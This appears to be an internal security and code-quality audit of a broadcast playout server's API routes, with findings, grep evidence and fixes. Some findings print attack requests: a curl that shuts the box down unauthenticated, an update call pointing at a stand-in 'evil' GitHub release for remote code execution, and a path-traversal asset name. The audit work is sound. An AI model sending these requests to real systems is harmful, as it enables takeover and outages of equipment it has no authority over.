# src/api part 4 — sweep 29.10.2026 (batch 064)

Files: 31 · lines: 4873 · findings: 1 BUG-HIGH, 5 BUG, 8 DEAD, 11 RISK, 34 QUALITY

Context for the checks below (live box, read-only GETs): `GET /api/auth/status` gives `enforceAuth:false`; `GET /api/settings` gives `server.bindAddress "0.0.0.0"` and `ui.nuclearRequirePassword:false`. Auth is one global gate in `router-dispatch.js` (`checkHttpAuth`), so "missing auth" is not a per-route finding here. The risk is that the gate is off by default (WO-811 in progress) and the nuclear-password gate is off too.
Router note: `RouteRegistry.dispatch` returns the result of the first matching route even when that result is `null`. It does not fall through to later registry routes, so a handler that returns `null` for an unknown sub-path ends in a 404.

## src/api/routes-streaming-channel.js
- `DEAD` src/api/routes-streaming-channel.js:37-44 — the re-exports `handleGet`, `broadcastStreamingChannelStatus`, `pushRtmpLog`, `pushRecordLog`, `STREAMING_RTMP_CONSUMER_INDEX`, `STREAMING_RECORD_CONSUMER_INDEX` have no consumer. grep: `grep -rn "routes-streaming-channel['\"]" src tools index.js` → only `src/api/router.js:45`, which uses `.handle` only. The callers require the `-log` / `-shared` sub-modules directly. Fix: export `handle` only.
- `QUALITY` src/api/routes-streaming-channel.js:26-31 — `GET /api/streaming-channel/` (trailing slash) matches the router's `/api/streaming-channel/*` entry with an empty capture. `handle()` returns `null` and the registry returns that `null`, whereas bare `/api/streaming-channel` gives the status payload. Failing case: slash form → 404, bare form → 200. No caller uses the slash form today.

## src/api/routes-streaming.js
- `QUALITY` src/api/routes-streaming.js:44-45 — `POST /api/streaming/toggle {"enabled":"false"}` evaluates `!!"false"` as `true` and starts streaming. `settings-post.js` accepts `'true'`/`'false'` strings explicitly. Fix: `b.enabled === true || b.enabled === 'true'`.
- `QUALITY` src/api/routes-streaming.js:17-29 — `GET /api/streams` returns the constant `{ streams: [], isRunning: false, config: {} }` whatever the state (same stub measured live). It is still read by `client/lib/stream-state.js` and `client/lib/webrtc-client.js`, so it is a stub, not dead. Comment it as such or drive it from the real pipeline.
- `RISK` src/api/routes-streaming.js:36-58 — `POST /api/streaming/toggle|restart` and `GET /api/streaming/ndi-sources` have no caller in `client/`, `godot/client/`, `tools/` or `scripts/` (grep `streaming/toggle|streaming/restart|streaming/ndi-sources` → only `docs/wiki`). Kept as public API (`docs/wiki/api/contract/http.md`), so not reported as DEAD.

## src/api/routes-support-bundle.js
- `OK` — line counts are clamped in `src/support/build-support-bundle.js:58-59` (100–5000 and 100–3000). `operatorNote` is capped at 2000 chars. The config goes through `redactObject`. Errors are caught and returned as 500.

## src/api/routes-system-hardware.js
- `DEAD` src/api/routes-system-hardware.js:65 — `POST /api/system/identify-displays` is dispatched here but never registered. `grep -n "identify-displays" src/api/router.js` → nothing. `grep -rn "identify-displays" src client godot/client tools scripts` → only this dispatch line and the handler file. The whole feature (`system-hardware-identify-displays.js`, 214 lines, spawns xterm overlays) is unreachable. It is the same family as the WO-317 comment at `router.js:149` ("shipped without this registration"). Register it or delete both.
- `QUALITY` src/api/routes-system-hardware.js:56 — `/api/system/gpu-nvidia/apply` → `handleGpuNvidiaApply` is a permanent 410 stub that only calls `parseBody`. The route is registered (`router.js:162`) and documented, but no client calls it (`grep -rn "gpu-nvidia/apply" client godot/client` → none). Candidate for removal.

## src/api/routes-system-licenses.js
- `DEAD` src/api/routes-system-licenses.js:1-55 — the whole file is never registered. `grep -rn "routes-system-licenses\|api/system/licenses" src client godot/client tools index.js` → only the file itself. Live `GET /api/system/licenses` returns `404 {"error":"Not found"}`. WO-495 already recorded it as "reported but NOT removed — owner call". It also advertises `indexUrl: '/licenses/INDEX.md'`. Delete it, or register it (WO-90 T90.C1 asked for it).

## src/api/routes-system-setup.js
- `RISK` src/api/routes-system-setup.js:179-192, 324-335 — on the default configuration, `POST /api/system/setup/reboot|shutdown|restart-app|restart-window-manager|install|caspar/stop|caspar/start|caspar/restart` are open to any host that can reach :4200. Live state: bind `0.0.0.0`, `enforceAuth:false`, `nuclearRequirePassword:false`, and `checkNuclearPassword` returns `{ok:true}` when `nuclearRequirePassword` is falsy. Failing case: from another LAN host, `curl -X POST http://<box>:4200/api/system/setup/shutdown` powers the playout box off. WO-811 is the planned fix; flagged so it is not forgotten for the default config.
- `RISK` src/api/routes-system-setup.js:179-192 — `checkNuclearPassword` has no attempt limit or delay. Every wrong guess costs a synchronous `crypto.scryptSync` (N=16384, r=8, about 16 MB; `src/utils/nuclear-password.js:12,31`) on the event loop. A loop of wrong-password POSTs both brute-forces the password and stalls AMCP/WS handling. The same helper gates update/apply, decklink/install, gui-launch, time and pointer-confine. Fix: per-IP counter with backoff, and the async `scrypt`.
- `QUALITY` src/api/routes-system-setup.js:69-96, 194-206, 256-266 — `execSync('command -v calamares')`, `execFileSync('sudo','-n','-l')`, two `systemctl is-active` calls and `runSudoNoPrompt` (15 s timeout) run synchronously inside request handlers. `GET /api/system/setup` makes four such calls per request. It measured 35 ms today, but a hung `sudo` or `systemctl` freezes the whole server for 4–15 s. Use the async `execFile`.
- `DEAD` src/api/routes-system-setup.js:471-480 — the exports `readDisplayMode`, `detectCasparServiceStatus`, `parseCasparControlOutput` have no importer. `grep -rn "readDisplayMode\|detectCasparServiceStatus\|parseCasparControlOutput" src tools` → only this file; all three are in `tools/ci/unwired-exports-baseline.json`. Keep `detectCalamaresStatus` (used by `tools/smoke/smoke-wo721-install-to-disk.test.js`) and `checkNuclearPassword`. `systemctlIsActive` has a separate twin in `src/network/tailscale-service.js:138`.

## src/api/routes-system-staged.js
- `BUG` src/api/routes-system-staged.js:21 + src/api/router.js:154-157 — the "staged Caspar arm" API is unreachable. The handler only matches `p === '/api/system/caspar-arm'`, but the router registers `/api/system/staged` and `/api/system/staged/*` (and nothing for `caspar-arm`). Failing case, measured live: `GET /api/system/caspar-arm` → `404 {"error":"Not found"}`, and `GET /api/system/staged` → 404 (the handler returns `null`). `README.md:133` and `docs/wiki/api/system-settings-hardware.md:77-79` promise `GET/POST/DELETE /api/system/caspar-arm`. Nothing consumes the arm file either: `grep -rn "caspar-armed\|CASPAR_ARM_FILE" --include=*.sh --include=*.js --include=*.service .` → only this file, and `tools/runtime/casparcg-staged-start.sh`, named in `tools/runtime/README.md`, does not exist. Treat the feature as dead: delete the file and the 4 router lines, or restore both ends.
- `DEAD` src/api/routes-system-staged.js:70-73 — `getArmPath` export is unused (baseline entry).
- `QUALITY` src/api/routes-system-staged.js:15 — hard-coded `/home/casparcg/highascg/data/caspar-armed` default instead of `REPO_ROOT`.

## src/api/routes-system-update.js
- `BUG-HIGH` src/api/routes-system-update.js:58-64 → src/system/server-update.js:389-414 — `POST /api/system/update/apply` forwards the body's `assetUrl`, `assetName` and `releaseTag` to `startApplyJob`, which prefers them over the verified GitHub check (`opts.assetUrl || check.assetUrl`). There are two holes.
  1. `downloadFile` only requires the URL to start with `https://github.com/` (server-update.js:248). ANY repository's release asset is accepted, extracted, and run through the privileged apply helper (`runApplyHelper`), so this is remote code execution as the update helper.
  2. `tarPath = path.join(cacheDir, assetName)` uses the raw `assetName`. It only has to match the stamp regex for the stamp, not for the path. So `assetName: "../../../../home/casparcg/.profile"` makes `downloadFile` write the downloaded bytes to that path.
  No in-repo client sends these fields (`client/components/settings-modal-system-updates.js:117` and `godot/client/features/settings/updates_pane.gd:87` send only `confirm` and `password`).
  Failing case on a release (non-git) box with the default config (no auth, no nuclear password): `curl -X POST :4200/api/system/update/apply -d '{"confirm":true,"assetUrl":"https://github.com/evil/x/releases/download/v1/highascg-server_1.tar.gz"}'`. This dev box is protected by the `.git` check (server-update.js:383). Fix: ignore the three body fields and take them from `checkForUpdate`. Or require the URL to start with `https://github.com/${repo}/releases/download/`, `assetName === path.basename(assetName)`, and `assetName` to match `^highascg-server_.+\.tar\.gz$`.
- `QUALITY` src/api/routes-system-update.js:44-49 — `try { parseBody(body) } catch` can never throw (`parseBody` swallows), so the 400 "Invalid JSON" branch is dead. Malformed JSON becomes `{}` and fails later on `confirm` with a different message. Use `parseBodyStrict`.

## src/api/routes-timeline.js
- `RISK` src/api/router.js:481-485 vs src/api/routes-timeline.js:16 — the registry entries are `/api/timeline/*` (singular), but the handler and every client use `/api/timelines…`. The registry entries never match. Timelines are served only by the legacy fall-through in `router-dispatch.js:104-131`, which sits inside `if (ctx.amcp)`. Failing case: with Caspar disconnected (`ctx.amcp` falsy), every `GET/PUT/POST /api/timelines…` returns 404 "Not found". The engine's CRUD needs no AMCP, so it should either work offline or give a clean 503. With Caspar up it works (live `GET /api/timelines` → `[] 200`). Fix: register `/api/timelines` and `/api/timelines/*` (`requireCaspar:false` for CRUD, `true` for `take`).
- `RISK` src/api/routes-timeline.js:62-65 — `DELETE /api/timelines/:id` for the timeline that is live on PROGRAM calls `eng.delete(id)` → `stop(id)` (timeline-engine.js:85-87) and takes PGM off air. It bypasses the WO-552 guard that makes `POST …/stop` answer 409 unless `force:true` (lines 109-119); that guard's own comment says the server must own the guarantee. Failing case: timeline on program, `DELETE /api/timelines/<id>` → 200 and the layers are stopped. Fix: apply the same `isOnProgram && b.force !== true` check in the DELETE branch.
- `QUALITY` src/api/routes-timeline.js:77 — `eng.play(id, Number(b.from))` with `from:"abc"` passes `NaN` (only `null`/`undefined` are guarded) and ends in `setCellPosition(cell, NaN)`. Validate with `Number.isFinite`.
- `QUALITY` src/api/routes-timeline.js:98-101, 150-152 — `pause` and `loop` do not check that the timeline exists. `engine._pbFor(id)` creates a playback cell for any id (`timeline-playback.js:38-44`), so `POST /api/timelines/<random>/loop` leaks a cell and emits a playback event for a non-existent timeline. `play`, `take`, `seek` and `sendto` do check.
- `QUALITY` src/api/routes-timeline.js:21 — `parseBody` turns malformed JSON into `{}`, so a garbled `POST /api/timelines` creates a new empty "Timeline" with three empty layers. Use `parseBodyStrict` on create/update.

## src/api/routes-usb-ingest.js
- `RISK` src/api/routes-usb-ingest.js:174-203 — check-then-act race. The `active` test (line 177) is followed by `await usbDrives.getDriveById` (188), and `setUsbImportState({active:true})` runs only at line 201. Two near-simultaneous `POST /api/usb/import` both pass: two copies run in parallel into the same target, the second overwrites `ctx._usbImportCancel` (199) so the first can no longer be cancelled, and the first's `finally` (250) nulls the second's token. Fix: set `active:true` synchronously before the first `await`.
- `QUALITY` src/api/routes-usb-ingest.js:229-243 — a user cancel surfaces as `phase:'error', error:'Cancelled'` plus an `error` broadcast (`copyFromUsb` throws `Error('Cancelled')`). UIs show a failure for a deliberate action.
- `DEAD` src/api/routes-usb-ingest.js:353-356 — the `getUsbIngestConfig` export has no importer (baseline entry). `POST /api/usb/mount` has no in-repo client (`grep -rn "usb/mount" client godot/client` → docs only) although `GET /api/usb/drives` returns `unmounted` for it. Kept as documented API.
- `OK` for traversal: `driveId` is decoded and must match a live `listUsbDrives()` entry (`src/media/usb-drives.js:25`). `path`/`items`/`targetSubdir` go through `resolveUnderMount` / `resolveSafe`. `blockDevice` is regex-checked and must be in the removable list before `udisksctl`.

## src/api/routes-v4l2-input.js
- `RISK` src/api/routes-v4l2-input.js:81-93 — `POST /api/v4l2-inputs/config` persists first (`configManager.save`, line 90-92) and validates afterwards, returning only warnings. Width/height/fps/count/bridge values are stored raw (`cs[wKey] = b[wKey]`, `cs.v4l2_input_count = b.v4l2_input_count`). `normalizeV4l2DevicePath` (`src/capture/v4l2-input-config.js:13-18`) validates nothing: both branches return `s`. Failing case: `{"v4l2_input_count":"x","v4l2_input_1_width":"-5"}` → 200, written to `caspar_server.json`. How the device string is later used in the ffmpeg bridge argv was not traced (other batch).
- `QUALITY` src/api/routes-v4l2-input.js:66-68 — the 400 "Invalid JSON body" branch is unreachable for malformed JSON (`parseBody` returns `{}`). Garbage → 200 `ok:true` with a config save. Use `parseBodyStrict`.

## src/api/routes-video-surfaces.js
- `OK` — `clientId` is validated, `roles` are filtered through `roleIndex` (`src/system/video-surfaces.js:150`), and leases expire by TTL sweep.

## src/api/routes-virtual-camera.js
- `RISK` src/api/routes-virtual-camera.js:109, 133-141 — `POST /api/virtual-camera/start {"persist":true}` saves `enabled:true` to disk (line 109). When the bridge then fails to start, only the in-memory copy is reset to `enabled:false` (line 135). Failing case: v4l2loopback absent → 502, but disk keeps `virtualCamera.enabled:true`, so the next boot retries and memory and disk disagree. Fix: persist after a successful start, or persist the revert too.
- `QUALITY` src/api/routes-virtual-camera.js:75-78 — same dead 400 branch: a garbage body gives `patch = {}`, the config is saved, and the bridge is restarted or stopped according to current state. Use `parseBodyStrict`.
- `QUALITY` src/api/routes-virtual-camera.js:151 — the `normalizeVirtualCameraConfig` re-export has no user through this module (`grep -rn "routes-virtual-camera" src tools` → `get-state.js` and `device-view-snapshot.js`, both `getStatusPayload` only). `syncVirtualCameraStatus` is in the unwired baseline.

## src/api/routes-vr.js
- `OK` — registered through `register(routes)`, every handler returns a reply, errors reach the router's 502 wrapper, and `minutes` is clamped in `src/vr/vr-session.js:283`.

## src/api/settings-get.js
- `QUALITY` src/api/settings-get.js:30-32 — a `loadProjectBySlug` failure is swallowed by `catch (_) {}`, so stream-credential status silently reports "no project key" on any project read error. Log it.
- `QUALITY` src/api/settings-get.js:33-130 — the response is one 60-line object literal with nested IIFEs and about 40 inline `screen_n_*` keys. `settings-post` and `settings-os` each keep another hand-written copy of the key set (`SYSTEM_DISPLAY_KEYS`), which is how WO-619 happened. Generate the three from one list.
- `OK` for secrets: stream keys are blanked (`streamKey:''`, `hasStreamKey`) and the payload goes through `redactObject`.

## src/api/settings-os.js
- `QUALITY` src/api/settings-os.js:103-108 — `casparServer` keys from the body are copied wholesale (`cs[k] = v` for every entry, line 106) with no key allow-list or type check. A `__proto__` key in the JSON sets the prototype of that one object (own-object only). Reachable only by a caller who can already rewrite config.
- `QUALITY` src/api/settings-os.js:147-182 — the xrandr "command preview" is rebuilt only to be logged. `dmRestarted` and `reapplyAfterRestart` are constants (`false`, "skipped by design") kept for response shape. Dead scaffolding.
- `OK` for command injection: the layout goes through `execFileSync` / `execFile` with `assertSafeXrandrOutputName` / `assertSafeXrandrModeToken` (`src/utils/xrandr-safety.js`), and the persisted `apply-layout.sh` only emits tokens that pass `assertSafeXrandrToken` (`src/utils/xrandr-persist-script.js`).

## src/api/settings-post.js
- `BUG` src/api/settings-post.js:186 — `cfg.gpuPhysicalTopologyOperatorSaved = true` is set on the in-memory copy only. `newConfig` (line 389) is built from `configManager.get()` (`cur`) plus a hand-written key list that does not contain it. `ctx.config` is a deep clone of the manager's config (`src/bootstrap/config.js:10`), so the flag never reaches disk. Evidence: `grep -o gpuPhysicalTopologyOperatorSaved config/*.json` → no hit, while `config/general.json` has `gpuPhysicalTopology`. Failing sequence: the operator edits the GPU layout in Device View → `POST /api/settings {gpuPhysicalTopology:[…]}` → the topology is saved and the flag is lost on restart → `src/utils/gpu-topology-xrandr.js:229` sees the flag false and overwrites the operator's layout with the DRM discovery (`config.gpuPhysicalTopology = discovered`). Only `POST /api/system/gpu-ports-reset {persist:true}` (`system-hardware-gpu-ports.js:39`) persists the flag. Fix: add `gpuPhysicalTopologyOperatorSaved: cfg.gpuPhysicalTopologyOperatorSaved` to `newConfig`.
- `BUG` src/api/settings-post.js:45, 47, 52-53 — `parseInt` results are stored unchecked. `{"caspar":{"port":"abc"}}` sets `cfg.caspar.port = NaN`; line 413 sees `NaN !== 5250` and calls `casparConnection.reconnect(host, NaN)`, and `JSON.stringify` writes `"port": null` into `caspar.json`. The same pattern applies to `streaming.basePort` (line 47) and `periodic_sync_interval_sec[_osc]` (lines 52-53). Fix: `Number.isInteger(n) && n>0 && n<65536` before assigning.
- `RISK` src/api/settings-post.js:152 — `settings.dmx` replaces the slice with `{...defaults.dmx, ...settings.dmx}` (not `...cfg.dmx`). A partial body such as `{dmx:{enabled:true}}` resets `artnetInputPort`, `artnetInputScreenIndex`, `fixtures` and the rest to defaults. The web client always sends the full slice (`client/components/settings-modal-logic.js:108`), so it only bites scripts and the Godot client. The `rtmp` / `casparServer` lines do merge `cfg.*`.
- `RISK` src/api/settings-post.js:106-146 — `local_media_path` comes from the body. If it exists, the live `/home/casparcg/highascg/media` symlink is unlinked (or a real directory renamed to `.bak_<ts>`) and re-pointed, with no check that the target is a directory or readable. `unlinkSync` (line 122) runs before `symlinkSync` (130), so a failing `symlinkSync` (EACCES) leaves no media link at all. A non-existent new path is still stored in `cfg.local_media_path` (line 112; warning only). The link path is hard-coded instead of derived from `REPO_ROOT`.
- `QUALITY` src/api/settings-post.js:46-50 — `s.quality`, `s.captureMode`, `s.x11Display`, `s.drmDevice`, `s.hardware_accel` are stored without type or enum checks, unlike `streamOutputs`, which whitelists codecs. `x11Display` and `drmDevice` end up in capture ffmpeg arguments.
- `QUALITY` src/api/settings-post.js:389 — the 3 KB single-line `newConfig` literal is the hand-listed structure from the memory note "settings POST newConfig is hand-listed". Keys mutated on `cfg` but missing from it are silently dropped on restart; the first BUG above is one. A test that diffs the keys assigned on `cfg` against the keys of `newConfig` would catch the class.

## src/api/system-hardware-decklink-install.js
- `BUG` src/api/system-hardware-decklink-install.js:35-39 — `spawnSync('sudo', ['-n', DECKLINK_INSTALL_SCRIPT], { timeout: 300000 })` blocks the Node event loop for the whole install, up to 5 minutes; a `dpkg`/DKMS build routinely takes tens of seconds. While blocked the server answers nothing: AMCP replies, OSC, WebSocket, the timeline ticker and `/api/ping` all stall, which on a live playout box can freeze a running timeline. Fix: use async `execFile` and return 202 with a poll, like `update/apply`.
- `QUALITY` src/api/system-hardware-decklink-install.js:24-30 — `payload` is never used and `parseBody` cannot throw, so the `try/catch` with its 400 is dead code.
- `QUALITY` src/api/system-hardware-decklink-install.js:100-150 — `POST /api/system/decklink/upload` has no nuclear-password check (install has one; upload only stages), accepts up to 2 GB per request and overwrites a same-named file. The name is regex-restricted and `path.basename`d, so there is no traversal. Busboy destroys the file stream on a truncated request, which unlinks the partial file (verified in `node_modules/busboy/lib/types/multipart.js:603-610`).

## src/api/system-hardware-decklink.js
- `QUALITY` src/api/system-hardware-decklink.js:34-43 — the vendor search directories are hard-coded `/home/casparcg/...` paths, duplicated from `system-hardware-decklink-install.js:93` and the shell lib `scripts/lib/decklink-install-lib.sh`. One list should feed all three.
- `OK` otherwise — probes have timeouts and failures degrade to warnings.

## src/api/system-hardware-gpu-layout.js
- `RISK` src/api/system-hardware-gpu-layout.js:93-95 — `card.board_model.toLowerCase()` and `card.gpu_family.toLowerCase()` throw on a database row missing either field (`data/gpu_database.json` is a user-editable file). The exception escapes to the router's 502. Guard with `String(card.board_model || '')`.
- `QUALITY` src/api/system-hardware-gpu-layout.js:1-5 — the header says "legacy, deprecated WO-108". `GET /api/system/gpu-layout` has no in-repo caller (`grep -rn "system/gpu-layout" client godot/client` → none, only `docs/wiki`). `getPhysicalPortsFromXrandrInventory` is still used by `system-hardware-summary.js`.

## src/api/system-hardware-gpu-ports.js
- `QUALITY` src/api/system-hardware-gpu-ports.js:35-41 — `persist` mutates the object returned by `cm.get()` in place before `save`. If `save` fails (returns false) the live manager config is already changed, and the return value is ignored (`persisted = true` regardless). Check the result of `cm.save(...)`.
- `OK` otherwise — this handler is the one path that persists `gpuPhysicalTopologyOperatorSaved`.

## src/api/system-hardware-gui-resolve.js
- `OK` — path resolution only; no request data reaches a shell.

## src/api/system-hardware-gui.js
- `QUALITY` src/api/system-hardware-gui.js:44, 252-266 — `spawnGuiDetached` supports `app:<id>` launches (WO-387), but `handleGuiLaunchPost`'s `okActions` rejects every `app:` action with 400, so that branch is reachable only through `operator-dock.js`. Not a bug (the dock is the intended caller); a comment on `okActions` would stop the next reader from "fixing" it.
- `OK` for injection: all spawns use argv arrays, the `app:` command comes from the on-disk `.desktop` entry, and `os-password` takes nothing from the request and is limited to `checkBoxLocalRequest`.

## src/api/system-hardware-identify-displays.js
- `DEAD` src/api/system-hardware-identify-displays.js:1-214 — unreachable (see `routes-system-hardware.js:65`: no `routes.post('/api/system/identify-displays')` and no client). The `killActiveOverlays` export is in the unwired baseline. grep: `grep -rn "identify-displays\|handleIdentifyDisplaysPost" src client godot/client tools scripts` → only the dispatch line and this file.

## src/api/system-hardware-network.js
- `QUALITY` src/api/system-hardware-network.js:97 — `static.dns[0]` is not validated with `isValidIpv4` (address and gateway are), yet it is handed to a root helper (`tools/runtime/highascg-network-apply.sh:128-133` and `237-238`: `echo "DNS=${dns_part}"`, `nmcli … ipv4.dns "$DNS"`). A newline cannot be smuggled in (`read -r -a` takes one line), but junk like `"x"` is written into the `.network` file. Validate every DNS entry in the handler.
- `QUALITY` src/api/system-hardware-network.js:102, 163 — `execFileSync('sudo', …, {timeout: 30000 / 45000})` blocks the event loop for up to 30 s / 45 s on every apply or reset (a NetworkManager reconfigure is slow). Same remedy as decklink install.
- `QUALITY` src/api/system-hardware-network.js:63 — in `if (!iface || !isAllowedEthernetIface(iface))` the second test is redundant, since `iface` was already built from that check.

## src/api/system-hardware-nvidia.js
- `QUALITY` src/api/system-hardware-nvidia.js:106, 66-80, 134 — `execFileSync('modinfo', …)` is synchronous (4 s timeout) inside an async handler, and `ubuntu-drivers devices` (15 s timeout) runs on every call. `GET /api/system/gpu-nvidia` measured 1.3 s. It is also embedded in the hardware summary (see below). Cache for 60 s like the CPU strings.
- `QUALITY` src/api/system-hardware-nvidia.js:165 — `handleGpuNvidiaApply` is a permanent 410 stub; see routes-system-hardware.js.

## src/api/system-hardware-operator-display.js
- `OK`

## src/api/system-hardware-summary.js
- `QUALITY` src/api/system-hardware-summary.js:4, 290 — the header promises "all probes with per-probe timeouts, total budget <3 s", but there is no overall timeout (only `Promise.allSettled`). The GPU probe pulls in `gpuNvidiaGet` (sync `modinfo` plus `ubuntu-drivers`) and the DeckLink probe pulls in the ffmpeg probe (2.6 s). Measured live: `GET /api/system/hardware` took 3.68 s. Only the CPU/OS strings are cached. Wrap in `Promise.race` with a deadline and cache the slow sections.
- `DEAD` src/api/system-hardware-summary.js:344-347 — the `getHardwareSummary` export is unused outside the file (baseline entry).

## src/api/system-hardware-xrandr-layout.js
- `QUALITY` src/api/system-hardware-xrandr-layout.js:10-18 — `handleXrandrLayoutGet` runs `calculateLayoutPositions` and `checkXrandrLayout` (xrandr subprocesses) synchronously. `GET /api/system/xrandr-layout` has no in-repo client (docs only).

## src/api/system-network-wifi.js
- `OK` — SSID and PSK are validated, the passphrase goes on stdin, and the helper path is allow-listed. (`execFileSync` blocking for up to 60 s is the same pattern as the Ethernet apply.)

## src/api/system-time.js
- `BUG` src/api/system-time.js:112-113, 135, 146 — setting a manual time first turns NTP **off** (line 135) and only then runs the `set` command (146). The date/time regexes check shape, not range, and the third token is silently ignored. Failing case: `POST /api/system/time {"set":"2026-13-45 25:99:99"}` passes validation, the helper rejects the value → 409, but NTP stays disabled, so the box's clock silently stops syncing. Fix: validate ranges (round-trip through `Date`), and re-enable NTP when `set` fails.
- `QUALITY` src/api/system-time.js:92-96, 98, 153 — `parseBody` cannot throw, so the `try/catch` is dead. `payload.ntp` is truthiness-tested, so `"false"` turns NTP on. Three `execFileSync` calls (10 s timeouts) block the loop.
- `OK` for injection: only digits, `:` and `-` reach the sudo helper, as separate argv entries.
